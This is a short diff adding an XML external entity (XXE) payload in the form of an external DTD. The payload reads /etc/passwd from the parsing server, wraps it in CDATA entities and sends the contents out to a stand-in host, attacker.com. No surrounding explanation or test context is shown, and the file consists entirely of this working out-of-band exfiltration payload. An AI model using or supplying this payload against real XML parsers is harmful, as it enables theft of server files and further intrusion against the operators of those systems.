@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?%start;%file;%end;'>">
+%wrapper;
